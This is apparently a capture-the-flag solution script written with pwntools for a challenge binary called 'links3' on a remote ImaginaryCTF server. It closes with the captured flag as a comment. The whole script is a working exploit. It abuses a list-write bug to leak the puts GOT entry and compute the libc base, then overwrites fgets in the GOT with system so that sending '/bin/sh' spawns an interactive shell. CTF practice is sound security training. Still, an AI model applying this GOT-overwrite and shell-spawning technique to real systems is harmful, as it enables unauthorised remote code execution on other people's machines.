from pwn import *

context.log_level = "debug"
elf = ELF("./links3")
libc = ELF("./libc.so.6")
# io = process("./links3")
io = remote("puzzler7.imaginaryctf.org", 2998)


def view_list():
    io.sendlineafter(b">>> ", b"1")


def write_item(idx, data):
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b">>> ", str(idx).encode())
    io.sendlineafter(b">>> ", data)


write_item(0, b"/bin/sh")
write_item(1, b"1")
write_item(2, b"2")
write_item(1, flat({64: p64(elf.got["puts"])}))
view_list()
io.recvuntil(b"2: ")
puts = int.from_bytes(io.recvn(6), "little")
print(f"{puts = :#x}")
libc_base = puts - libc.sym["puts"]
print(f"{libc_base = :#x}")
libc.address = libc_base
write_item(1, flat({64: p64(elf.got["fgets"])}))
write_item(2, p64(libc.sym["system"]))
write_item(0, b"/bin/sh")
io.interactive()
# ictf{dammit_I'm_never_gonna_mix_up_64_and_0x64_again_it's_cost_me_three_flags_already}
